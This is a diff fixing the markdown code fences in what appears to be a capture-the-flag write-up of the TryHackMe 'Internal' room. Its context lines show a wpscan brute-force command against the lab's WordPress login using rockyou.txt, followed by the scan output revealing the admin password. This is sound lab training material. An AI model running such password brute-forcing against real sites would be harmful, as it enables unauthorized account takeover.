@@ -80,7 +80,7 @@ Task Completed
 - With this information lets try and run a `wpscan` to find the password
 - `wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords rockyou.txt -t 100`
 - **wpscan Scan Results:**
-'''
+```
 [!] Valid Combinations Found:
  | Username: admin, Password: my2boys
 
@@ -94,8 +94,8 @@ Task Completed
 [+] Data Received: 20.636 MB
 [+] Memory used: 320.254 MB
 [+] Elapsed time: 00:02:17
-'''
+```
 
-'''
+```
 We are able to find that the login credentials are **Username: admin, Password: my2boys**
-'''
+```
